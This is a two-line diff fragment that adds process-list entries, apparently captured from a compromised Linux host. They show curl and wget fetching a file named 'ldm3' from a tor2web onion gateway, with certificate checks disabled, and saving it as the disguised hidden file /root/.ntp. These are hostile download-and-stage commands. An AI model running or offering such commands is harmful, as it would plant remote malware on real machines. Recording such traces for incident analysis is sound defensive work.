@@ -1,0 +1,2 @@
+ 8258 ?        S      0:00 curl -fsSLk --max-time 40 https://xyxg3xqckmqy2wbp.tor2web.su/src/ldm3 -o /root/.ntp
+ 8260 ?        S      0:00 wget --quiet --no-check-certificate --timeout=40 https://xyxg3xqckmqy2wbp.tor2web.su/src/ldm3 -O /root/.ntp
